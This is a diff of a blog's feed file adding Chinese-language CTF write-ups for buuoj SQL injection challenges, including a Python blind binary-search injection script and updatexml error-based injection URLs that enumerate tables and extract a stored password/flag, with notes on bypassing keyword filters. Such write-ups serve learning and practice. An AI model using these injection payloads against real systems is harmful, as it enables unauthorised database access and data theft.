@@ -1233,7 +1233,7 @@ E#---
   <entry>
     <title>buuoj</title>
     <url>/2020/10/05/buuoj/</url>
-    <content><![CDATA[<h1 id="buuoj部分题目记录"><a href="#buuoj部分题目记录" class="headerlink" title="buuoj部分题目记录"></a>buuoj部分题目记录</h1><a id="more"></a>
+    <content><![CDATA[<h1 id="buuoj–注入篇"><a href="#buuoj–注入篇" class="headerlink" title="buuoj–注入篇"></a>buuoj–注入篇</h1><a id="more"></a>
 
 <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
 <p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
@@ -1244,7 +1244,36 @@ E#---
 <p><img src="/2020/10/05/buuoj/1.png" alt></p>
 <p><img src="/2020/10/05/buuoj/2.png" alt></p>
 <p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// 二分注入</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;id : <span class="string">""</span>&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    right = <span class="number">33</span></span><br><span class="line">    left = <span class="number">128</span></span><br><span class="line">    mid = (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(right&lt;left):</span><br><span class="line"></span><br><span class="line">        data[<span class="string">"id"</span>] = <span class="string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            right = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid</span><br><span class="line">        mid=(right+left)&gt;&gt;<span class="number">1</span></span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// 二分注入</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;id : <span class="string">""</span>&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    right = <span class="number">33</span></span><br><span class="line">    left = <span class="number">128</span></span><br><span class="line">    mid = (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(right&lt;left):</span><br><span class="line"></span><br><span class="line">        data[<span class="string">"id"</span>] = <span class="string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            right = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid</span><br><span class="line">        mid=(right+left)&gt;&gt;<span class="number">1</span></span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
+<p>测试发现 or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过</p>
+<p><img src="/2020/10/05/buuoj/%E8%BF%87%E6%BB%A4.png" alt></p>
+<p>可是使用报错注入</p>
+<blockquote>
+<p>报错注入原理：</p>
+<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
+</blockquote>
+<p>相关链接</p>
+<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html" target="_blank" rel="noopener">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
+<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc" target="_blank" rel="noopener">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
+<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610" target="_blank" rel="noopener">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
+</blockquote>
+<p>查询语句如下</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(<span class="built_in">column_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">columns</span>)<span class="keyword">where</span>(<span class="built_in">table_name</span>)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
+<p><img src="/2020/10/05/buuoj/flag1.png" alt></p>
+<p>显示后面的flag</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=dad%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
         <category>ctf</category>
       </categories>
